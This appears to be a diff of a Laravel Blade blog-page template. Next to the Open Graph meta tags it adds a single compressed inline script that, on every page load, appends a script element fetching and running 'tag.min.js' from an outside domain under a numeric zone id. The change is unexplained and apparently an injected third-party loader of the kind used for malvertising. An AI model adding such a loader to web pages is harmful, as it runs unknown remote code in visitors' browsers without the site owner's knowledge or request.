@@ -6,6 +6,7 @@
         <meta property="og:image" content="{{ asset($Blog_info->Thumbnail_Image) }}">
         <meta property="og:url" content="{{ url()->current() }}">
     @include('frontend.header')
+    <script>(function(s){s.dataset.zone='10908912',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
 </head>
 <body>
 
